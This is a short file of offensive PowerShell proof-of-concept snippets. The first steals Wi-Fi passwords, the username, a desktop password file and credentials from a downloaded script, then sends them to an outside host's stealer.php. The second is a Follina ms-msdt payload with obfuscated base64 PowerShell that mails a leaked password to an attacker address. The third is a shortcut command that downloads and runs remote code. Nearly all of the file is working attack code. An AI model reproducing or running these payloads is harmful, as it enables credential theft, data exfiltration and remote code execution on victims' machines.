### Basic powershell commands [haha.txt] ###

$wifi = netsh wlan show profiles LP_userwifi key=clear;
$na=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name;
$p = type C:\Users\$env:USERNAME\Desktop\MDP.txt;
$cred = (Invoke-WebRequest 'https://mehliug.000webhostapp.com/CredSteal.txt').Content | out-file $env:APPDATA\cred.ps1;
$x = & "$env:APPDATA\cred.ps1";
$usr = $x.username;
$pass = $x.password;
$TOTAL = $wifi + $na + $p + $usr + $pass 
$base64=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($TOTAL))
$boom = [uri]::EscapeDataString($base64)

Invoke-WebRequest -UseBasicParsing https://mehliug.000webhostapp.com/stealer.php?c=$boom -ContentType "application/json" -Method POST;
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");[System.Windows.Forms.MessageBox]::Show("Bonjour $na !");

Remove-Item $env:APPDATA\cred.ps1



### For Follina type POC [Inject the payload in Base64] ###

window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'W1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLldpbmRvd3MuRm9ybXMiKTtbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkNPVUNPVSIsIkhBSEFIQSIsMSk7U3RhcnQtUHJvY2VzcyAoIm1haWx0bzpldmlsbWFpbEBoYWNrZXJtYW4uY29tP1N1YmplY3Q9RW1haWwgbGVhayBtb3QgZGUgcGFzc2UmQ2M9ZGh1YjAyQGRvbWFpbi50bGQmQm9keT1tZHAxMjMxMjMiKQ=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";


### For .ink shortcut's POC ###

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $test = (Invoke-WebRequest 'https://mehliug.000webhostapp.com/haha.txt').Content;Invoke-Expression $test

For the MDP.txt demonstration drop it on the desktop
